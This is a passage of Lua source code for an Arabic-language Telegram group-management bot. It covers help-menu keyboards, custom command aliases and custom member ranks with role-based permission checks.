return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ عذرا ليس لديك صلاحية التحكم لهذا الامر .")..'&show_alert=true')
end
local Help = DevaMeR:get(LanZo..'aMeR:Help3')
local Text = [[
᥀︙اوامر المدراء ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙فحص البوت
᥀︙ضع اسم + الاسم
᥀︙اضف • حذف ↫ رد
᥀︙ردود المدير
᥀︙حذف ردود المدير
᥀︙اضف • حذف ↫ رد متعدد
᥀︙حذف رد من متعدد
᥀︙الردود المتعدده
᥀︙حذف الردود المتعدده
᥀︙حذف قوائم المنع
᥀︙منع ↫ بالرد على ( ملصق • صوره • متحركه )
᥀︙حذف قائمه منع + ↫ ⤈
( الصور • المتحركات • الملصقات )
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تنزيل الكل
᥀︙رفع ادمن • تنزيل ادمن
᥀︙الادمنيه • حذف الادمنيه
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تثبيت
᥀︙الغاء التثبيت
᥀︙اعاده التثبيت
᥀︙الغاء تثبيت الكل
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تغير رد + اسم الرتبه + النص ↫ ⤈
᥀︙المطور • منشئ الاساسي
᥀︙المنشئ • المدير • الادمن
᥀︙المميز • المنظف • العضو
᥀︙حذف ردود الرتب
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تغيير الايدي ↫ لتغيير الكليشه
᥀︙تعيين الايدي ↫ لتعيين الكليشه
᥀︙حذف الايدي ↫ لحذف الكليشه
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تفعيل • تعطيل + الامر ↫ ⤈
᥀︙اطردني • الايدي بالصوره • الابراج
᥀︙معاني الاسماء • اوامر النسب • انطق
᥀︙الايدي • تحويل الصيغ • اوامر التحشيش
᥀︙ردود المدير • ردود المطور • التحقق
᥀︙ضافني • حساب العمر • الزخرفه
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙[Source Channel](https://t.me/Bw5Bw)
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList4:(.*)') then
local aMeR = DataText:match('/HelpList4:(.*)')
if tonumber(aMeR) == tonumber(data.sender_user_id_) then
if not Admin(data) then
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ عذرا ليس لديك صلاحية التحكم لهذا الامر .")..'&show_alert=true')
end
local Help = DevaMeR:get(LanZo..'aMeR:Help4')
local Text = [[
᥀︙اوامر المنشئين ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تنزيل الكل
᥀︙الميديا • امسح
᥀︙تعين عدد الحذف
᥀︙ترتيب الاوامر
᥀︙اضف • حذف ↫ امر
᥀︙حذف الاوامر المضافه
᥀︙الاوامر المضافه
᥀︙اضف نقاط ↫ بالرد • بالايدي
᥀︙اضف رسائل ↫ بالرد • بالايدي
᥀︙رفع منظف • تنزيل منظف
᥀︙المنظفين • حذف المنظفين
᥀︙رفع مدير • تنزيل مدير
᥀︙المدراء • حذف المدراء
᥀︙تفعيل • تعطيل + الامر ↫ ⤈
᥀︙نزلني • امسح
᥀︙الحظر • الكتم
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙اوامر المنشئين الاساسيين ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙وضع لقب + اللقب
᥀︙تفعيل • تعطيل ↫ الرفع
᥀︙رفع منشئ • تنزيل منشئ
᥀︙المنشئين • حذف المنشئين
᥀︙رفع • تنزيل ↫ مشرف
᥀︙رفع بكل الصلاحيات
᥀︙حذف القوائم
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙اوامر المالكين ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙رفع • تنزيل ↫ منشئ اساسي
᥀︙حذف المنشئين الاساسيين 
᥀︙المنشئين الاساسيين 
᥀︙حذف جميع الرتب
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙[Source Channel](https://t.me/Bw5Bw)
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList5:(.*)') then
local aMeR = DataText:match('/HelpList5:(.*)')
if tonumber(aMeR) == tonumber(data.sender_user_id_) then
if not Admin(data) then
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ عذرا ليس لديك صلاحية التحكم لهذا الامر .")..'&show_alert=true')
end
local Help = DevaMeR:get(LanZo..'aMeR:Help5')
local Text = [[
᥀︙اوامر المطورين ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙الكروبات
᥀︙المطورين
᥀︙المشتركين
᥀︙الاحصائيات
᥀︙المجموعات
᥀︙اسم البوت + غادر
᥀︙اسم البوت + تعطيل
᥀︙كشف + -ايدي المجموعه
᥀︙رفع مالك • تنزيل مالك
᥀︙المالكين • حذف المالكين
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙رفع • تنزيل ↫ مدير عام
᥀︙حذف • المدراء العامين 
᥀︙رفع • تنزيل ↫ ادمن عام
᥀︙حذف • الادمنيه العامين 
᥀︙رفع • تنزيل ↫ مميز عام
᥀︙حذف • المميزين عام 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙اوامر المطور الاساسي ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تحديث
᥀︙السيرفر
᥀︙روابط الكروبات
᥀︙تحديث السورس
᥀︙تنظيف الكروبات
᥀︙تنظيف المشتركين
᥀︙حذف جميع الملفات
᥀︙تعيين الايدي العام
᥀︙تغير المطور الاساسي
᥀︙حذف معلومات الترحيب
᥀︙تغير معلومات الترحيب
᥀︙غادر + -ايدي المجموعه
᥀︙تعيين عدد الاعضاء + العدد
᥀︙حظر عام • الغاء العام
᥀︙كتم عام • الغاء العام
᥀︙قائمه العام • حذف قائمه العام
᥀︙وضع • حذف ↫ اسم البوت
᥀︙اضف • حذف ↫ رد عام
᥀︙ردود المطور • حذف ردود المطور
᥀︙تعيين • حذف • جلب ↫ رد الخاص
᥀︙جلب نسخه الكروبات
᥀︙رفع النسخه + بالرد على الملف
᥀︙تعيين • حذف ↫ قناة الاشتراك
᥀︙جلب كليشه الاشتراك
᥀︙تغيير • حذف ↫ كليشه الاشتراك
᥀︙رفع • تنزيل ↫ مطور
᥀︙المطورين • حذف المطورين
᥀︙رفع • تنزيل ↫ مطور ثانوي
᥀︙الثانويين • حذف الثانويين
᥀︙تعيين • حذف ↫ كليشة الايدي
᥀︙اذاعه للكل بالتوجيه ↫ بالرد
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تفعيل ملف + اسم الملف
᥀︙تعطيل ملف + اسم الملف
᥀︙تفعيل • تعطيل + الامر ↫ ⤈
᥀︙الاذاعه • الاشتراك الاجباري
᥀︙ترحيب البوت • المغادره
᥀︙البوت الخدمي • التواصل
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙[Source Channel](https://t.me/Bw5Bw)
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList6:(.*)') then
local aMeR = DataText:match('/HelpList6:(.*)')
if tonumber(aMeR) == tonumber(data.sender_user_id_) then
local Help = DevaMeR:get(LanZo..'aMeR:Help6')
local Text = [[
᥀︙اوامر الاعضاء ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙السورس • موقعي • رتبتي • معلوماتي 
᥀︙رقمي • لقبي • نبذتي • صلاحياتي • غنيلي
᥀︙ميمز • متحركه • صوره • ريمكس • فلم • مسلسل • انمي
᥀︙رسائلي • حذف رسائلي • اسمي • معرفي 
᥀︙ايدي •ايديي • جهاتي • راسلني • الالعاب 
᥀︙نقاطي • بيع نقاطي • القوانين • زخرفه 
᥀︙رابط الحذف • نزلني • اطردني • المطور 
᥀︙منو ضافني • مشاهدات المنشور • الرابط 
᥀︙ايدي المجموعه • معلومات المجموعه 
᥀︙نسبه الحب • نسبه الكره • نسبه الغباء 
᥀︙نسبه الرجوله • نسبه الانوثه • التفاعل
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙لقبه + بالرد
᥀︙كول + الكلمه
᥀︙زخرفه + اسمك
᥀︙برج + نوع البرج
᥀︙معنى اسم + الاسم
᥀︙بوسه • بوسها ↫ بالرد
᥀︙احسب + تاريخ ميلادك
᥀︙صلاحياته ↫ بالرد • بالمعرف • بالايدي
᥀︙ايدي • كشف  ↫ بالرد • بالمعرف • بالايدي
᥀︙تحويل + بالرد ↫ صوره • ملصق • صوت • بصمه
᥀︙انطق + الكلام تدعم جميع اللغات مع الترجمه للعربي
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙[Source Channel](https://t.me/Bw5Bw)
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
end
if (data.ID == "UpdateNewMessage") then
local msg = data.message_
text = msg.content_.text_ 
if text and DevaMeR:get(LanZo.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
local NewCmmd = DevaMeR:get(LanZo.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
if NewCmmd then
DevaMeR:del(LanZo.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
DevaMeR:del(LanZo.."Set:Cmd:Group:New"..msg.chat_id_)
DevaMeR:srem(LanZo.."List:Cmd:Group:New"..msg.chat_id_,text)
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم حذف الامر من المجموعه", 1, 'html')  
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙لايوجد امر بهذا الاسم", 1, 'html')
end
DevaMeR:del(LanZo.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if text and text:match('^'..(DevaMeR:get(LanZo..'aMeR:NameBot') or "لانزو")..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..(DevaMeR:get(LanZo..'aMeR:NameBot') or "لانزو")..' ','')
end
if data.message_.content_.text_ then
local NewCmmd = DevaMeR:get(LanZo.."Set:Cmd:Group:New1"..msg.chat_id_..":"..data.message_.content_.text_)
if NewCmmd then
data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
end
end
if text and DevaMeR:get(LanZo.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
DevaMeR:set(LanZo.."Set:Cmd:Group:New"..msg.chat_id_,text)
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙ارسل الامر الجديد", 1, 'html')
DevaMeR:del(LanZo.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
DevaMeR:set(LanZo.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_,"true1") 
return false
end
if text and DevaMeR:get(LanZo.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_) == "true1" then
local NewCmd = DevaMeR:get(LanZo.."Set:Cmd:Group:New"..msg.chat_id_)
DevaMeR:set(LanZo.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text,NewCmd)
DevaMeR:sadd(LanZo.."List:Cmd:Group:New"..msg.chat_id_,text)
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الامر", 1, 'html')
DevaMeR:del(LanZo.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if Constructor(msg) then
if text == "الاوامر المضافه" and ChCheck(msg) then
local List = DevaMeR:smembers(LanZo.."List:Cmd:Group:New"..msg.chat_id_.."") 
t = "᥀︙قائمة الاوامر المضافه ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
Cmds = DevaMeR:get(LanZo.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
if Cmds then 
t = t..k.."~ ("..v..") • {"..Cmds.."}\n"
else
t = t..k.."~ ("..v..") \n"
end
end
if #List == 0 then
t = "᥀︙لاتوجد اوامر مضافه في المجموعه"
end
Dev_aMeR(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
if text == "حذف الاوامر المضافه" and ChCheck(msg) or text == "حذف الاوامر" and ChCheck(msg) or text == "مسح الاوامر المضافه" and ChCheck(msg) then
local List = DevaMeR:smembers(LanZo.."List:Cmd:Group:New"..msg.chat_id_)
for k,v in pairs(List) do
DevaMeR:del(LanZo.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
DevaMeR:del(LanZo.."List:Cmd:Group:New"..msg.chat_id_)
end
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم حذف الاوامر المضافه في المجموعه", 1, 'html')
end
if text == "ترتيب الاوامر" and Constructor(msg) and ChCheck(msg) then
DevaMeR:set(LanZo.."Set:Cmd:Group:New1"..msg.chat_id_..":ا","ايدي")
DevaMeR:sadd(LanZo.."List:Cmd:Group:New"..msg.chat_id_,"ا")
DevaMeR:set(LanZo.."Set:Cmd:Group:New1"..msg.chat_id_..":م","رفع مميز")
DevaMeR:sadd(LanZo.."List:Cmd:Group:New"..msg.chat_id_,"م")
DevaMeR:set(LanZo.."Set:Cmd:Group:New1"..msg.chat_id_..":اد","رفع ادمن")
DevaMeR:sadd(LanZo.."List:Cmd:Group:New"..msg.chat_id_,"اد")
DevaMeR:set(LanZo.."Set:Cmd:Group:New1"..msg.chat_id_..":مد","رفع مدير")
DevaMeR:sadd(LanZo.."List:Cmd:Group:New"..msg.chat_id_,"مد")
DevaMeR:set(LanZo.."Set:Cmd:Group:New1"..msg.chat_id_..":من","رفع منشئ")
DevaMeR:sadd(LanZo.."List:Cmd:Group:New"..msg.chat_id_,"من")
DevaMeR:set(LanZo.."Set:Cmd:Group:New1"..msg.chat_id_..":اس","رفع منشئ اساسي")
DevaMeR:sadd(LanZo.."List:Cmd:Group:New"..msg.chat_id_,"اس")
DevaMeR:set(LanZo.."Set:Cmd:Group:New1"..msg.chat_id_..":مط","رفع مطور")
DevaMeR:sadd(LanZo.."List:Cmd:Group:New"..msg.chat_id_,"مط")
DevaMeR:set(LanZo.."Set:Cmd:Group:New1"..msg.chat_id_..":ثانوي","رفع مطور ثانوي")
DevaMeR:sadd(LanZo.."List:Cmd:Group:New"..msg.chat_id_,"ثانوي")
DevaMeR:set(LanZo.."Set:Cmd:Group:New1"..msg.chat_id_..":تك","تنزيل الكل")
DevaMeR:sadd(LanZo.."List:Cmd:Group:New"..msg.chat_id_,"تك")
DevaMeR:set(LanZo.."Set:Cmd:Group:New1"..msg.chat_id_..":تعط","تعطيل الايدي بالصوره")
DevaMeR:sadd(LanZo.."List:Cmd:Group:New"..msg.chat_id_,"تعط")
DevaMeR:set(LanZo.."Set:Cmd:Group:New1"..msg.chat_id_..":تفع","تفعيل الايدي بالصوره")
DevaMeR:sadd(LanZo.."List:Cmd:Group:New"..msg.chat_id_,"تفع")
DevaMeR:set(LanZo.."Set:Cmd:Group:New1"..msg.chat_id_..":ر","الرابط")
DevaMeR:sadd(LanZo.."List:Cmd:Group:New"..msg.chat_id_,"ر")
DevaMeR:set(LanZo.."Set:Cmd:Group:New1"..msg.chat_id_..":رر","ردود المدير")
DevaMeR:sadd(LanZo.."List:Cmd:Group:New"..msg.chat_id_,"رر")
DevaMeR:set(LanZo.."Set:Cmd:Group:New1"..msg.chat_id_..":،،","مسح المكتومين")
DevaMeR:sadd(LanZo.."List:Cmd:Group:New"..msg.chat_id_,"،،")
DevaMeR:set(LanZo.."Set:Cmd:Group:New1"..msg.chat_id_..":رد","اضف رد")
DevaMeR:sadd(LanZo.."List:Cmd:Group:New"..msg.chat_id_,"رد")
DevaMeR:set(LanZo.."Set:Cmd:Group:New1"..msg.chat_id_..":سح","مسح سحكاتي")
DevaMeR:sadd(LanZo.."List:Cmd:Group:New"..msg.chat_id_,"سح")
DevaMeR:set(LanZo.."Set:Cmd:Group:New1"..msg.chat_id_..":رس","مسح رسائلي")
DevaMeR:sadd(LanZo.."List:Cmd:Group:New"..msg.chat_id_,"رس")
DevaMeR:set(LanZo.."Set:Cmd:Group:New1"..msg.chat_id_..":غ","غنيلي")
DevaMeR:sadd(LanZo.."List:Cmd:Group:New"..msg.chat_id_,"غ")
DevaMeR:set(LanZo.."Set:Cmd:Group:New1"..msg.chat_id_..":#","مسح قائمه العام")
DevaMeR:sadd(LanZo.."List:Cmd:Group:New"..msg.chat_id_,"#")
send(msg.chat_id_, msg.id_,"᥀︙تم ترتيب الاوامر بالشكل التالي ~\n᥀︙ ايدي - ا .\n᥀︙ رفع مميز - م .\n᥀︙رفع ادمن - اد .\n᥀︙ رفع مدير - مد . \n᥀︙ رفع منشى - من . \n᥀︙ رفع منشئ الاساسي - اس  .\n᥀︙ رفع مطور - مط .\n᥀︙رفع مطور ثانوي - ثانوي .\n᥀︙ تنزيل الكل - تك .\n᥀︙ تعطيل الايدي بالصوره - تعط .\n᥀︙ تفعيل الايدي بالصوره - تفع .\n᥀︙ الرابط - ر .\n᥀︙ ردود المدير - رر .\n᥀︙ مسح المكتومين - ،، .\n᥀︙ اضف رد - رد .\n᥀︙ مسح سحكاتي - سح .\n᥀︙ مسح رسائلي - رس .\n᥀︙ غنيلي - غ .\n᥀︙مسح قائمه العام - #")  
end
if text == "اضف امر" and ChCheck(msg) or text == "اضافة امر" and ChCheck(msg) or text == "اضافه امر" and ChCheck(msg) then
DevaMeR:set(LanZo.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙ارسل الامر القديم", 1, 'html')
return false
end
if text == "حذف امر" and ChCheck(msg) or text == "مسح امر" and ChCheck(msg) then 
DevaMeR:set(LanZo.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙ارسل الامر الذي قمت باضافته يدويا", 1, 'html')
return false
end
end
--     Source LanZo     --
if text == "الصلاحيات" and ChCheck(msg) or text == "صلاحيات" and ChCheck(msg) then 
local List = DevaMeR:smembers(LanZo.."Coomds"..msg.chat_id_)
if #List == 0 then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙لاتوجد صلاحيات مضافه", 1, 'html')
return false
end
t = "᥀︙قائمة الصلاحيات المضافه ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
var = DevaMeR:get(LanZo.."Comd:New:rt:aMeR:"..v..msg.chat_id_)
if var then
t = t..k.."~ "..v.." • ("..var..")\n"
else
t = t..k.."~ "..v.."\n"
end
end
Dev_aMeR(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
if Admin(msg) then
if text == "حذف الصلاحيات" and ChCheck(msg) or text == "مسح الصلاحيات" and ChCheck(msg) then
local List = DevaMeR:smembers(LanZo.."Coomds"..msg.chat_id_)
for k,v in pairs(List) do
DevaMeR:del(LanZo.."Comd:New:rt:aMeR:"..v..msg.chat_id_)
DevaMeR:del(LanZo.."Coomds"..msg.chat_id_)
end
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم حذف الصلاحيات المضافه", 1, 'html')
end
end
if text and text:match("^اضف صلاحيه (.*)$") and ChCheck(msg) then 
ComdNew = text:match("^اضف صلاحيه (.*)$")
DevaMeR:set(LanZo.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
DevaMeR:sadd(LanZo.."Coomds"..msg.chat_id_,ComdNew)  
DevaMeR:setex(LanZo.."Comd:New"..msg.chat_id_..msg.sender_user_id_,200,true)  
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙ارسل نوع الصلاحيه \n{ عضو • مميز  • ادمن  • مدير }\n᥀︙ارسل الغاء لالغاء الامر ", 1, 'html')
end
if text and text:match("^حذف صلاحيه (.*)$") and ChCheck(msg) or text and text:match("^مسح صلاحيه (.*)$") and ChCheck(msg) then 
ComdNew = text:match("^حذف صلاحيه (.*)$") or text:match("^مسح صلاحيه (.*)$")
DevaMeR:del(LanZo.."Comd:New:rt:aMeR:"..ComdNew..msg.chat_id_)
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم حذف الصلاحيه", 1, 'html')
end
if DevaMeR:get(LanZo.."Comd:New"..msg.chat_id_..msg.sender_user_id_) then 
if text and text:match("^↫ الغاء ᥀$") then 
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء الامر", 1, 'html')
DevaMeR:del(LanZo.."Comd:New"..msg.chat_id_..msg.sender_user_id_) 
return false  
end 
if text == "مدير" then
if not Constructor(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تستطيع اضافة صلاحية ( عضو • مميز  • ادمن )\n᥀︙ارسال نوع الصلاحيه مره اخرى", 1, 'html')
return false
end
end
if text == "ادمن" then
if not Manager(msg) then 
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تستطيع اضافة صلاحية ( عضو • مميز )\n᥀︙ارسال نوع الصلاحيه مره اخرى", 1, 'html')
return false
end
end
if text == "مميز" then
if not Admin(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تستطيع اضافة صلاحية ( عضو )\n᥀︙ارسال نوع الصلاحيه مره اخرى", 1, 'html')
return false
end
end
if text == "مدير" or text == "ادمن" or text == "مميز" or text == "عضو" then
local textn = DevaMeR:get(LanZo.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
DevaMeR:set(LanZo.."Comd:New:rt:aMeR:"..textn..msg.chat_id_,text)
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم اضافة الصلاحيه", 1, 'html')
DevaMeR:del(LanZo.."Comd:New"..msg.chat_id_..msg.sender_user_id_) 
return false  
end 
end

if text and text:match("رفع (.*)") and tonumber(msg.reply_to_message_id_) > 0 then 
local DEV_aMeR = text:match("رفع (.*)")
if DevaMeR:sismember(LanZo.."Coomds"..msg.chat_id_,DEV_aMeR) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mraMeR = DevaMeR:get(LanZo.."Comd:New:rt:aMeR:"..DEV_aMeR..msg.chat_id_)
if mraMeR == "مميز" and VipMem(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'Bw5Bw')..')'..' ❩\n᥀︙تم رفعه ❨ '..DEV_aMeR..' ❩ بنجاح', 1, 'md')
DevaMeR:set(LanZo.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_aMeR) 
DevaMeR:sadd(LanZo..'aMeR:VipMem:'..msg.chat_id_, result.sender_user_id_)
elseif mraMeR == "ادمن" and Admin(msg) then 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'Bw5Bw')..')'..' ❩\n᥀︙تم رفعه ❨ '..DEV_aMeR..' ❩ بنجاح', 1, 'md')
DevaMeR:set(LanZo.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_aMeR)
DevaMeR:sadd(LanZo..'aMeR:Admins:'..msg.chat_id_, result.sender_user_id_)
elseif mraMeR == "مدير" and Manager(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'Bw5Bw')..')'..' ❩\n᥀︙تم رفعه ❨ '..DEV_aMeR..' ❩ بنجاح', 1, 'md')
DevaMeR:set(LanZo.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_aMeR)  
DevaMeR:sadd(LanZo..'aMeR:Managers:'..msg.chat_id_, result.sender_user_id_)
elseif mraMeR == "عضو" then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'Bw5Bw')..')'..' ❩\n᥀︙تم رفعه ❨ '..DEV_aMeR..' ❩ بنجاح', 1, 'md')
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match("تنزيل (.*)") and tonumber(msg.reply_to_message_id_) > 0 then 
local DEV_aMeR = text:match("تنزيل (.*)")
if DevaMeR:sismember(LanZo.."Coomds"..msg.chat_id_,DEV_aMeR) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mraMeR = DevaMeR:get(LanZo.."Comd:New:rt:aMeR:"..DEV_aMeR..msg.chat_id_)
if mraMeR == "مميز" and VipMem(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'Bw5Bw')..')'..' ❩\n᥀︙تم تنزيله ❨ '..DEV_aMeR..' ❩ بنجاح', 1, 'md')
DevaMeR:srem(LanZo..'aMeR:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevaMeR:del(LanZo.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mraMeR == "ادمن" and Admin(msg) then 
